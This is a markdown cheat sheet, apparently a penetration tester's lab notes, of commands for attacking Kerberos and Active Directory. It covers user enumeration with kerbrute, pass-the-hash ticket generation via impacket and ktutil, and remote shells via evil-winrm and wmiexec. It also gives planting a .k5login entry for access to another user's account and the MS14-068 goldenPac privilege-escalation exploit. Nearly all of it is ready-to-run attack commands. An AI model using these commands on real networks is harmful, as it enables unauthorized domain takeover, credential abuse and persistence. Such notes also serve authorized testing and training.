---
title: "Kerberos"
date: 2024-7-2
tags: ["kerberos", "kerbrute", "active directory", "ad", "domain controller", "Windows", "smb", "MS14-068", "golden ticket", "goldpac"]
---

---
### Kerbrute

[kerbrute](https://github.com/ropnop/kerbrute)

```bash
kerbrute userenum --domain <DOMAIN> --dc <DC> usernames.txt
```

#### Usernames generator

[username-anarchy](https://github.com/urbanadventurer/username-anarchy)

```bash
./username-anarchy -i users.txt | tee usernames.txt
```

<br>

---

### Generate Kerberos Ticket (From Linux)

#### Method #1: Using impacket

```bash
sudo ntpdate -s <DC> && impacket-getTGT -hashes :<HASH> <DOMAIN>/administrator
```

```bash
export KRB5CCNAME=administrator.ccache
```

```bash
# Check ticket
klist
```

#### Method #2 : Using kinit

```bash
# Step 0: Installation
sudo apt install krb5-user cifs-utils
```

```bash
# Step 1: Add domain controller to '/etc/hosts' (Try different order if not work)
10.10.11.10 <DC> <DOMAIN>
```

```bash
# Step 2: Add domain controller as a DNS server to '/etc/resolv.conf'
nameserver 10.10.11.10
```

```bash
# Step 3: Edit '/etc/krb5.conf'

[libdefaults]
    default_realm = <DOMAIN>

[realms]
    <DOMAIN> = {
        kdc = <DC>:88
        admin_server = <DC>
        default_domain = <DOMAIN>
    }
    
[domain_realm]
    .domain.internal = <DOMAIN>
    domain.internal = <DOMAIN>
```

```bash
# Step 4: Sync time to domain controller
sudo ntpdate -s <DC>
```

#### 2a. Without Creds

```bash
# Generate kerberos ticket for user
kinit <USER>
```

#### 2b. With Hash

```bash
ktutil
```

```bash
add_entry -p administrator@<DOMAIN> -k 1 -key -e rc4-hmac
```

```bash
<HASH>
```

```bash
write_kt administrator.keytab
```

```bash
exit
```

```bash
kinit -V -k -t administrator.keytab -f administrator@<DOMAIN>
```

#### 3. Check ticket

```bash
klist
```

<br>

---

### Remote to target with kerberos

#### Method #1 : Using evil-winrm 

```bash
sudo ntpdate -s <DC> && evil-winrm -i <TARGET_DOMAIN> -r <DOMAIN>
```

#### Method #2 : Using wmiexec

```bash
sudo ntpdate -s <DC> && impacket-wmiexec <DOMAIN>/administrator@<TARGET_DOMAIN> -k -no-pass
```

<br>

---

### Connect to SMB with kerberos

```bash
sudo ntpdate -s <DC> && impacket-smbclient <DOMAIN>/<USER>@<TARGET_DOMAIN> -k -no-pass
```

<br>

---

### Add Kerboros Access (Linux)

```bash
echo "<USER>@<DOMAIN>" > /home/<TARGET_USER>/.k5login
```

<br>

---

### MS14-068 (Forged Golden Ticket)

```bash
# With creds
impacket-goldenPac '<DOMAIN>/<USER>:<PASSWORD>@<TARGET_DOMAIN>'
```

```bash
# With hash
impacket-goldenPac --hashes :hash '<DOMAIN>/<USER>@<TARGET_DOMAIN>'
```

<br>